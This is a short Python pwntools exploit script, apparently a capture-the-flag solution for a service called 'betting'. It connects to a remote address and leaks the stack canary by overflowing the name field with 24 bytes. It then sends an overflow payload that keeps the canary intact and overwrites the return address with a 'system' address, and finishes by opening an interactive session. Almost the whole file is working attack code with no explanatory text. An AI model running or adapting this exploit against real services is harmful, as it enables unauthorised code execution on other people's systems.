from pwn import *

context.log_level='debug'


if __name__ == "__main__":

	s=remote('110.10.147.29', 8282)
	#s=process('./betting')
	system=0x00000000004008F6

	raw_input('1')	
	s.recvuntil('What is your name? ')
	s.send('A'*24+'\n')

	s.recvuntil('How much money would you like to start with?')
	s.sendline('1111')

	s.recvuntil('A'*24)
	canary=s.recv(8)

	canary=u64(canary)-10

	print "canary: "+str(canary)

	s.recvuntil('you have $')
	money=s.recvuntil('.')
	
	#s.recvuntil('How much money do you want to bet?')
	s.sendline(money)

	print "Money: "+str(money)

	s.recvuntil('for lower: ')
	s.sendline('A'*0x28+p64(canary)+p64(system)*2)

	s.interactive()
